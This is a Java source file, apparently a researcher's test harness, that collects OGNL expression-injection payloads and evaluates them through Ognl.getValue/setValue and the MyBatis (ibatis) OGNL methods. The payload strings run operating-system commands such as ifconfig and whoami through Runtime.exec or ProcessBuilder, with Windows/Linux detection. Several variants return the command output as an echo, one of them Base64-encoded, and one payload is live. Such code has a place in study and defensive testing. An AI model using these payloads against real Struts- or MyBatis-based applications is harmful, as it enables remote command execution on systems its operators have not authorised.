package org.example;

import ognl.Ognl;
import ognl.OgnlContext;

/**
 * @author Whoopsunix
 */
public class OGNL {

    public static void main(String[] args) {
        /**
         * 无回显 get触发
         */
//        String baseGetPayload = "@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')";
//        ognlGetValue(baseGetPayload);

        /**
         * 无回显 set触发
         */
//        String baseSetPayload = "(@java.lang.Runtime@getRuntime().exec(\'open -a Calculator.app\'))(a)(b)";
//        ognlGetValue(baseSetPayload);

        /**
         * Ognl解析后，存在直接打印的情况
         * 直接套用 命令执行给的 InputStream 处理方式读取
         */
//        String IOUtilsPayload = "{(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),'UTF-8'))}";
//        ognlGetValue(IOUtilsPayload);
//        String IOUtilsPayload1 = "{(new java.lang.String(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())))}";
//        ognlGetValue(IOUtilsPayload1);

        String ScannerPayload = "{(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())).useDelimiter(\"\\\\A\").next()}";
        ognlGetValue(ScannerPayload);

//        String StreamUtilsPayload = "{(new java.lang.String(@org.springframework.util.StreamUtils@copyToByteArray(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())))}";
//        ognlGetValue(StreamUtilsPayload);

//        String processBuilderPayload = "{(#iswin=(new java.lang.Boolean(\"true\")).booleanValue())?(#cmds=(new java.lang.String[]{\"cmd.exe\",\"/c\",\"ipconfig\"})):(#cmds=(new java.lang.String[]{\"/bin/bash\",\"-c\",\"ifconfig\"})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(new java.io.ByteArrayOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
//        ognlGetValue(processBuilderPayload);

        // processBuilder形式构建
//        String test = "(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))";
//        ognlGetValue(test);

        /**
         * base64加密
         */
        // 原生
//        String base64Encode = "(#inputStream=@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()).(@java.util.Base64@getEncoder().encodeToString((new java.util.Scanner(#inputStream).useDelimiter('\\\\A').next().getBytes())))";
//        ognlGetValue(base64Encode);

//        // 用 IOUtils 实现
//        String base64EncodeIOUtils = "(#str=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),'UTF-8')).(#base64=@java.util.Base64@getEncoder().encodeToString(#str.getBytes()))";

    }

    /**
     * ognl.Ognl#getValue()
     */
    public static void ognlGetValue(String payload) {
        try {
            Object obj = Ognl.getValue(payload, null);
            System.out.println(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * ognl.Ognl#setValue()
     */
    public static void ognlSetValue(String payload) {
        try {
            Ognl.setValue(payload, new OgnlContext(), "");
        } catch (Exception e) {

        }
    }


    /**
     * org.apache.ibatis.ognl.Ognl.getValue()
     */
    public static void ognlGetValueIbatis(String payload) throws Exception {
        try {
            Object obj = org.apache.ibatis.ognl.Ognl.getValue(payload, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * org.apache.ibatis.ognl.Ognl.setValue()
     */
    public static void ognlSetValueIbatis(String payload) throws Exception {
        try {
            org.apache.ibatis.ognl.Ognl.setValue(payload, new OgnlContext(), "");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
